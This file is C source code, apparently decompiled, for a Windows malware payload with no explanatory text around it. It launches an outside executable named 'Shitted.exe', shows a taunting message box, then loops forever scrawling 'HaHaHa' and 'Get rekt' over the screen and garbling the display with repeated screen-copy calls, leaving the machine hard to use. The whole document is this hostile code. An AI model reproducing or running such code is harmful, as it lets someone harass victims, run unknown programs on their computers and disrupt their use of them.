#include <windows.h>


int main(int argc, const char **argv, const char **envp)
{
  int v3; // ebx
  int v4; // eax
  int v5; // ebx
  int v6; // eax
  int v7; // ebx
  int v8; // eax
  int y1; // esi
  int x1; // ebx
  int v11; // er12
  int v12; // er13
  int v13; // edi
  int v14; // eax
  int v15; // esi
  int v16; // ebx
  int v17; // er12
  int v18; // er13
  int v19; // edi
  int v20; // eax
  HDC hdcSrc; // [rsp+58h] [rbp-28h]
  int v22; // [rsp+68h] [rbp-18h]
  int x; // [rsp+6Ch] [rbp-14h]
  HDC hdc; // [rsp+70h] [rbp-10h]
  int v25; // [rsp+78h] [rbp-8h]
  int cy; // [rsp+7Ch] [rbp-4h]
  int v27; // [rsp+80h] [rbp+0h]
  int v28; // [rsp+84h] [rbp+4h]
  HDC v29; // [rsp+88h] [rbp+8h]
  HDC v30; // [rsp+90h] [rbp+10h]
  HWND v31; // [rsp+98h] [rbp+18h]
  HWND v32; // [rsp+98h] [rbp+18h]
  HWND hWnd; // [rsp+A0h] [rbp+20h]
  int v34; // [rsp+ACh] [rbp+2Ch]

  //_main();
  system("Shitted.exe");
  hWnd = GetForegroundWindow();
  MessageBoxA(hWnd, "Uhh how did u get this well ur still fucked", "SHEEESSHHH", 0x30u);
  v31 = GetForegroundWindow();
  GetDC(v31);
  GetDC(0i64);
  v28 = GetSystemMetrics(0);
  v27 = GetSystemMetrics(1);
  cy = GetSystemMetrics(0);
  v25 = GetSystemMetrics(1);
  hdc = GetDC(0i64);
  while ( 1 )
  {
    v3 = rand() % v25;
    v4 = rand();
    TextOutA(hdc, v4 % cy, v3, "Still hackeno", 12);
    v5 = rand() % v25;
    v6 = rand();
    TextOutA(hdc, v6 % cy, v5, "HaHaHa", 6);
    v7 = rand() % v25;
    v8 = rand();
    TextOutA(hdc, v8 % cy, v7, "Get rekt", 8);
    ++v34;
    x = rand() % cy;
    v22 = rand() % 4000;
    hdcSrc = GetDC(0i64);
    BitBlt(hdcSrc, x, v34, v22, cy, hdcSrc, x, 0, 0xCC0020u);
    v32 = GetForegroundWindow();
    v30 = GetDC(v32);
    v29 = GetDC(0i64);
    BitBlt(v29, -1, 1, v28, v27, v30, 1, 1, 0x999999u);
    y1 = rand() % 100;
    x1 = rand() % 100;
    v11 = rand() % v25;
    v12 = rand() % cy;
    v13 = rand() % 100;
    v14 = rand();
    BitBlt(hdcSrc, v14 % 100, v13, v12, v11, hdcSrc, x1, y1, 0xCC0020u);
    v15 = rand() % 5;
    v16 = rand() % 5;
    v17 = rand() % v25;
    v18 = rand() % cy;
    v19 = rand() % 5;
    v20 = rand();
    BitBlt(hdcSrc, v20 % 5, v19, v18, v17, hdcSrc, v16, v15, 0xCC0020u);
  }
}
